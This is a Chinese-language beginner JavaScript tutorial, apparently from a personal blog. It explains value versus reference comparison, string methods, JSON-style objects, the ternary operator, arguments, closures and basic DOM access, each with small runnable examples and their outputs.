<p>常用区域：堆空间、栈空间</p>
<p>基本数据类型：依据的是数值是否一样。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num1=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> num2=<span class="number">100</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1==num2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>这两个数值100，存储于内存当中栈空间。</p>
</li>
<li><p>而且 num1 与 num2 这两个变量，存储的就是“房间”中主人公 100</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2024/04/11/xdygFWY31i8sz6T.png" alt="image-20240410163745439"></p>
<ul>
<li>引用类型的变量</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> b=[<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a==b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/bYT3qfsGrwIzvHp.png" alt="image-20240410164039301"></p>
<ul>
<li><p>引用类型数据存储于内存当中堆空间。</p>
</li>
<li><p>而当前变量 a 与变量 b，存储不是房间里面“主人公”，存储的是“门牌号”，由于“门牌号”不同，因此这两个数据不相等。</p>
</li>
</ul>
<p>门牌号：即为内存中地址</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="字符串属性与方法"><a href="#字符串属性与方法" class="headerlink" title="字符串属性与方法"></a>字符串属性与方法</h3><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><p>概述：字符串拥有 length 属性，它主要的作用是可以获取到字符串中字符的个数（空格也会计入在内）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;你 好&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">你</span><br><span class="line"></span><br><span class="line">好</span><br></pre></td></tr></table></figure>

<ul>
<li>length 属性也经常结合循环语句一起使用，遍历字符串中每一个字符</li>
</ul>
<h4 id="indexOf-和-lastIndexOf"><a href="#indexOf-和-lastIndexOf" class="headerlink" title="indexOf 和 lastIndexOf"></a>indexOf 和 lastIndexOf</h4><p>主要的作用分别是：</p>
<p>indexOf：获取到第一个匹配到的字符的索引值。</p>
<p>lastIndexOf：获取到的最后一个匹配到的字符的索引值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;兄弟，兄弟...&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;兄弟&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;你好香&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;兄弟&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;你好香&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果字符在字符串中没有出现，返回的是数字 -1</li>
</ul>
<h4 id="toLowerCase-和-toUpperCase"><a href="#toLowerCase-和-toUpperCase" class="headerlink" title="toLowerCase 和 toUpperCase"></a>toLowerCase 和 toUpperCase</h4><p>主要的作用分别是：</p>
<p>toLowerCase：将字符串中英文字符变为小写</p>
<p>toUpperCase：将字符串中英文字符变为大写</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;aBcDeF兄弟&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str. <span class="title function_">toLowerCase</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">toUpperCase</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">abcdef兄弟</span><br><span class="line"><span class="variable constant_">ABCDEF</span>兄弟</span><br></pre></td></tr></table></figure>

<p>他们两者属于字符串方法：是将字符串英文字符变为大小写。（都是返回一个新的字符串，对于起始字符串没有影响）</p>
<h4 id="search-与-split"><a href="#search-与-split" class="headerlink" title="search 与 split"></a>search 与 split</h4><p>主要的作用分别是：</p>
<p>search：获取到某一个字符的索引值。</p>
<p>split：将字符串通过某一个字符切割为数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;兄弟，兄弟...&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">search</span>(<span class="string">&quot;兄弟&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">split</span>(<span class="string">&quot;弟&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">split</span>(<span class="string">&quot;你好香&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">[ <span class="string">&#x27;兄&#x27;</span>, <span class="string">&#x27;，兄&#x27;</span>, <span class="string">&#x27;...&#x27;</span> ]</span><br><span class="line">[ <span class="string">&#x27;兄弟，兄弟...&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<h4 id="substring-和-substr"><a href="#substring-和-substr" class="headerlink" title="substring 和 substr"></a>substring 和 substr</h4><p>主要的作用分别是：</p>
<p>substring：它是字符串方法，主要的作用是在父串当中切割出一个子串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">str.<span class="title function_">substring</span>(起始索引值，结束索引值)</span><br></pre></td></tr></table></figure>

<p>包含起始索引值，不包含结束索引值</p>
<p>substr：它也是字符串方法，它主要的作用也是从父串当中切割出一个子串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">str.<span class="title function_">substr</span>(起始索引值，切割长度)</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;兄弟，你好香&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">substr</span>(<span class="number">3</span>,<span class="number">6</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">兄弟</span><br><span class="line">你好香</span><br></pre></td></tr></table></figure>

<h4 id="replace-和-match"><a href="#replace-和-match" class="headerlink" title="replace 和 match"></a>replace 和 match</h4><p>主要的作用分别是：</p>
<p>replace：可以替换某一个字符串中复合条件的字符进行替换。</p>
<p>match：可以将某一个字符串中符合条件的第一个字符匹配出来，返回一个数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;兄弟，你好香&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">replace</span>(<span class="string">&quot;你好香&quot;</span>,<span class="string">&quot;兄弟...&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(<span class="string">&quot;兄弟&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">兄弟，兄弟...</span><br><span class="line">[ <span class="string">&#x27;兄弟&#x27;</span>, <span class="attr">index</span>: <span class="number">0</span>, <span class="attr">input</span>: <span class="string">&#x27;兄弟，你好香&#x27;</span>, <span class="attr">groups</span>: <span class="literal">undefined</span> ]</span><br></pre></td></tr></table></figure>

<h2 id="JSON-数据格式"><a href="#JSON-数据格式" class="headerlink" title="JSON 数据格式"></a>JSON 数据格式</h2><p>概述：JSON（JavaScript Object Nonation）是 JS 对象一种标记法。</p>
<p>在 JS 当中是有 JSON 数据格式，JSON 数据格式是由一个大的花括号表，JSON 数据格式在 JS 当中是引用类型数据。JSON 数据格式作用如下：</p>
<ol>
<li><p>前端工程师可以和后台工程师进行数据交换。</p>
</li>
<li><p>JSON 数据格式可以通过  K:V 键值对存储数据、读取、修改、添加数据。</p>
</li>
</ol>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	“name”: “小明”，</span><br><span class="line">	“age”:<span class="number">12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>JSON 数据格式经常用存储、读取、修改、新增数据操作。</li>
</ul>
<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> info=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;校长&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">12</span>,<span class="string">&quot;habby&quot;</span>:<span class="string">&quot;reading&quot;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;&#125;</span><br><span class="line">object</span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;校长&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>, <span class="attr">habby</span>: <span class="string">&#x27;reading&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>JSON 数据格式常用功能即为存储数据。</p>
</li>
<li><p>JSON 数据格式是通过 K:V 键值对进行存储数据。</p>
</li>
<li><p>JSON 数据格式 K 务必需要加上双引号。</p>
</li>
<li><p>JSON 存储的时候右侧 V 可以是任意类型的数值。</p>
</li>
</ul>
<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><p>概述：JSON 数据格式可以通过点语法或枚举法读取数据。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> info=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;校长&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">12</span>,<span class="string">&quot;habby&quot;</span>:<span class="string">&quot;reading&quot;</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info.<span class="property">habby</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;校长&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>, <span class="attr">habby</span>: <span class="string">&#x27;reading&#x27;</span> &#125;</span><br><span class="line">校长</span><br><span class="line">校长</span><br><span class="line"><span class="number">12</span></span><br><span class="line">reading</span><br></pre></td></tr></table></figure>

<h3 id="修改已有数据"><a href="#修改已有数据" class="headerlink" title="修改已有数据"></a>修改已有数据</h3><p>概述：我们也可以通过点语法或枚举法修改 JSON 数据格式里面的 V。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> info=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;校长&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">12</span>,<span class="string">&quot;habby&quot;</span>:<span class="string">&quot;reading&quot;</span>&#125;;</span><br><span class="line">info.<span class="property">name</span>=<span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line">info[<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;李四&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>, <span class="attr">habby</span>: <span class="string">&#x27;reading&#x27;</span> &#125;</span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>, <span class="attr">habby</span>: <span class="string">&#x27;reading&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="添加新的-K-V-键值对"><a href="#添加新的-K-V-键值对" class="headerlink" title="添加新的 K:V 键值对"></a>添加新的 K:V 键值对</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> info=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;校长&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">12</span>,<span class="string">&quot;habby&quot;</span>:<span class="string">&quot;reading&quot;</span>&#125;;</span><br><span class="line">info.<span class="property">sex</span>=<span class="string">&quot;男&quot;</span>;</span><br><span class="line">info[<span class="string">&quot;国籍&quot;</span>]=<span class="string">&quot;中国&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;校长&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>, <span class="attr">habby</span>: <span class="string">&#x27;reading&#x27;</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;国籍&#x27;</span>: <span class="string">&#x27;中国&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>点语法或枚举法在没有当前这个 K 的时候，给 JSON 数据格式在添加新的 K:V 键值对。</p>
</li>
<li><p>点语法或枚举法在有 K 情况，会修改 JSON 中 K:V 键值对。</p>
</li>
</ul>
<h2 id="JS-基础语法进阶"><a href="#JS-基础语法进阶" class="headerlink" title="JS 基础语法进阶"></a>JS 基础语法进阶</h2><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>概述：三元运算符是由三部分组成，使用语法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">A？<span class="attr">B</span>:C</span><br></pre></td></tr></table></figure>

<p>注：三元运算符在实战当中，经常给变量进行赋值。</p>
<ul>
<li><p>A：它需要的是一个布尔值（其他类型数值也可以，但是需要隐士转换为布尔值）</p>
</li>
<li><p>如果 A 部分为布尔值真，返回结果即为 B。如果布尔值为假的，返回结果即为 C</p>
</li>
<li><p>B 和 C：可以是任意类型数值、或者是一些表达式</p>
</li>
</ul>
<h3 id="类数组对象-arguments"><a href="#类数组对象-arguments" class="headerlink" title="类数组对象 arguments"></a>类数组对象 arguments</h3><p>概述：函数体中拥有一个引用类型数据 arguments。</p>
<p>类数组对象：类数组对象不是数组，类似数组，因为只能使用数组的 length 属性，不能使用数组的方法</p>
<p>类数组存在意义：在函数没有形参情况下，在函数体中可以获取到传递给函数实参。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数的函数体中才有类数组对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span> ()&#123;</span><br><span class="line"><span class="comment">//类数组对象:是引用类型数据</span></span><br><span class="line"><span class="comment">//类数组对象存在意义：可以在没有形参情况下，获取函数实参</span></span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">sum += <span class="variable language_">arguments</span>[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum);</span><br><span class="line"><span class="comment">//类数组：arguments类数组对象（用中括号表示），因为只能使用数组length属性值</span></span><br><span class="line"><span class="comment">//数组的方法都不能使用</span></span><br><span class="line"><span class="comment">//arguments.pop(); 这种写法即为错误的，因为类数组没有length属性值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fun</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包：一个可以访问其他作用域中的变量，这样的一个函数即为闭包</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量num = 100</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">100</span>;</span><br><span class="line"><span class="comment">//声明一个函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span> ()&#123;</span><br><span class="line">num++;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"><span class="title function_">fun</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当函数 fun 第一次调用时候:在函数作用域中没有变量 num，因此会沿着作用域链向上（全局）查询</p>
</li>
<li><p>当函数 fun 第一次执行的时候，将全局变量 num 由 100 变为 101</p>
</li>
<li><p>当函数 fun 第二次执行的时候，将全局变量 num 由 101 变为 102</p>
</li>
<li><p>当函数 fun 第三次执行的时候，将全局变量 num 由 102 变为 103</p>
</li>
</ul>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 声明外层函数</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params">x</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是outer函数体，执行一次&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 声明内层函数</span></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">function</span> <span class="title function_">inner</span>(<span class="params">y</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(x + y);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">inner</span>(<span class="number">200</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">outer</span>(<span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 输出</span><br><span class="line">我是outer函数体，执行一次</span><br><span class="line">300</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当 inner 函数执行的时候，inner 作用域中没有局部变量 x，因此沿着作用域链向上查询借用</p>
</li>
<li><p>x&#x3D;100，y&#x3D;200，因此打印的结果 300</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		a=<span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">function</span> <span class="title function_">inner</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			a+=<span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> inner;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> result=<span class="title function_">outer</span>();</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">result</span>();</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">result</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> result1=<span class="title function_">outer</span>();</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">result1</span>();</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">result1</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 输出</span><br><span class="line">110</span><br><span class="line">120</span><br><span class="line">110</span><br><span class="line">120</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当 outer 函数第一次执行的时候，声明了一个局部变量 a &#x3D; 100；以及声明了第一个 inner 函数声明部分并且把 inner 函数声明部分返回。</p>
</li>
<li><p>当后面部分执行的时候，在自身作用域中没有变量 a，因此沿着作用域链向上查询（outer）。</p>
</li>
<li><p>而且每一次调用 a 数值在 100 基础上加上 10。</p>
</li>
</ul>
<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><h4 id="DOM-认知"><a href="#DOM-认知" class="headerlink" title="DOM 认知"></a>DOM 认知</h4><p>问题：还记得 JavaScript 是由几部分组成的？</p>
<p>ECMAScript：简称 ES，它是欧洲计算机协会，大概每年的六月中旬定制语法规范。</p>
<p>DOM：全称 document object model 即为文档对象模型</p>
<p>BOM：全称 browser object model 即为浏览器对象模型</p>
<h4 id="节点树"><a href="#节点树" class="headerlink" title="节点树"></a>节点树</h4><p>概述：节点即为标签。节点之间这种关系，我们称之为“节点树”。</p>
<p>DOM：文档对象模型，可以理解为是整个节点树最外层“根元素”。</p>
<p>DOM 其实就是 JS 语言中内置引用类型 document 对象，DOM 对象经常用来操作节点（标签）</p>
<p>比如：操作节点样式、属性、文本等等。</p>
<p><img src="https://s2.loli.net/2024/04/11/CiL7YjdvuqxbE3n.png" alt="image-20240410224909650"></p>
<h4 id="DOM-属性"><a href="#DOM-属性" class="headerlink" title="DOM 属性"></a>DOM 属性</h4><p>DOM（document object model）：它在 JS 当中，是引用类型数据，官方给我们提供很多属性、方法进行操作。</p>
<h5 id="documentElement：获取节点树-html-标签"><a href="#documentElement：获取节点树-html-标签" class="headerlink" title="documentElement：获取节点树 html 标签"></a>documentElement：获取节点树 html 标签</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>);</span><br></pre></td></tr></table></figure>

<h5 id="head：获取节点树的-head-标签"><a href="#head：获取节点树的-head-标签" class="headerlink" title="head：获取节点树的 head 标签"></a>head：获取节点树的 head 标签</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">head</span>);</span><br></pre></td></tr></table></figure>

<h5 id="title：获取节点数的-title-标签"><a href="#title：获取节点数的-title-标签" class="headerlink" title="title：获取节点数的 title 标签"></a>title：获取节点数的 title 标签</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">title</span>);</span><br></pre></td></tr></table></figure>

<h5 id="body：获取节点树中的-body-标签"><a href="#body：获取节点树中的-body-标签" class="headerlink" title="body：获取节点树中的 body 标签"></a>body：获取节点树中的 body 标签</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>

<h5 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">head</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">title</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/YngVakBPJjLAmux.png" alt="image-20240411101619725"></p>
<h4 id="DOM-方法"><a href="#DOM-方法" class="headerlink" title="DOM 方法"></a>DOM 方法</h4><p>概述：DOM 对象，官方也给我们提供很多方法用来操作节点树上的标签。</p>
<p>getElementById：它是 DOM 对象方法，可以通过标签 ID 选择器，在 JS 当中获取标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> element=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(element);</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">type</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 输出 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span>&gt;</span></span><br><span class="line">text</span><br></pre></td></tr></table></figure>

<ul>
<li>一般我们将 script 标签放在程序最底部</li>
